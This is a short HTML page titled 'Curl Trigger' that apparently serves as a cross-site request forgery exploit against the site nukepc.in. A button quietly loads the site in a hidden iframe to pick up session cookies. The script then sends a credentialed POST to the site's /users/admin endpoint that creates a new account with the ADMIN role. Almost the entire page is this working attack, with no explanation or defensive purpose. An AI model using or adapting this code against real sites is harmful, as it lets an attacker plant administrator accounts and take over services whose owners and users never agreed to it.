<!DOCTYPE html>
<html>
<head>
<title>Curl Trigger</title>
</head>

<body>

<h2>Send Request</h2>

<button onclick="start()">Run</button>

<script>

function start(){

// first load nukepc site (to ensure cookies/session)
var frame = document.createElement("iframe");
frame.style.display = "none";
frame.src = "https://nukepc.in/";
document.body.appendChild(frame);

// wait a few seconds then send API request
setTimeout(send,3000);

}

function send(){

fetch("https://api.nukepc.in/users/admin", {
method: "POST",
credentials: "include",
headers:{
"Content-Type":"application/json"
},
body: JSON.stringify({
firstName:"ram",
lastName:"ram",
mobile:"7890757890",
email:"test1323@test.com",
role:"ADMIN"
})
})
.then(res=>res.text())
.then(data=>{
console.log(data);
alert("Request Sent");
})
.catch(err=>{
console.log(err);
});

}

</script>

</body>
</html>
